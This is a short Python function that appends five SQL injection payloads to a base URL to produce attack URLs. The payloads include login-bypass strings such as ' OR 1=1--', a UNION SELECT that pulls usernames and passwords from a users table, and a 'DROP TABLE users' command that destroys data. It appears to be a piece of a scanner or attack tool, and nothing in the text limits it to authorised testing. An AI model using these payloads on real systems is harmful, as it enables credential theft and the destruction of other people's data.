def generate_sql_payloads(base_url):
    payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' UNION SELECT null,null--",
        "' AND 1=0 UNION SELECT username, password FROM users--",
        "'; DROP TABLE users;--",
    ]
    return [f"{base_url}{payload}" for payload in payloads]
